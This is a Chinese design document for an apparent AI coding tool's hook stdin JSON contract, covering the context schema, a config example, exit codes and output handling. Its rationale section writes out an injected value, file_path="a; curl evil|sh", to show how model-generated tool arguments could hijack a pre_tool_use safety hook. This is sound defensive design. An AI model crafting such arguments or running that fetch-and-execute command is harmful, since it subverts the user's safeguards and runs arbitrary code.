# Hook stdin JSON 契约

Hook 是用户在 `.mewcode/config.yaml` 里声明、在生命周期事件上触发的自动化。
本文档说明 hook 命令与子进程之间的输入约定，对应实现：
`mewcode/hooks/executors.py`、`mewcode/hooks/engine.py`。

## 事件上下文的传递方式

`type: command` 的 hook 通过 **stdin 接收 JSON**，而非字符串插值：

```
stdin  =  UTF-8 JSON（一次写入，随后关闭）
```

JSON 结构即 `HookContext` 的序列化：

```json
{
  "event": "pre_tool_use",
  "tool": "Bash",
  "args": {"command": "git status", "file_path": "..."},
  "file_path": "...",
  "message": "",
  "error": ""
}
```

**为什么不做字符串插值**：hook 上下文里的字段（尤其 `args.*`、
`file_path`）来自 LLM 生成的工具参数。若把这些值直接拼进 shell 命令，
模型构造 `file_path="a; curl evil|sh"` 即可借用户自己的 hook 执行任意
命令——pre_tool_use hook 本是安全防护机制，插值设计反而成为攻击面。
stdin JSON 让子进程自行 `json.load(sys.stdin)`，值永远作为数据、
不进入 shell 语法。

## Hook 配置示例

```yaml
hooks:
  - event: pre_tool_use
    match:
      tool: Bash
    action:
      type: command
      command: python .mewcode/hooks/check.py
      timeout: 10
    reject: true   # 退出码非 0 时拒绝本次工具调用
```

## 退出码语义

- 退出码 `0`：hook 通过；`reject: true` 的 pre_tool_use hook 不拦截。
- 退出码非 `0`：视为失败；`reject: true` 时工具调用被拒绝，失败输出
  会作为拒绝原因返回给模型。

## 输出消费

- stdout 会被收集为 `HookNotification`（成功与失败都记录），按 owner
  （agent id）隔离，随事件流通知对应代理。
- `type: prompt` 的 hook 把 action 的 `message` 字段注入对话上下文。
- `async_exec: true` 的 hook 在后台执行（引擎持有强引用，退出时统一
  取消），不阻塞当前事件。
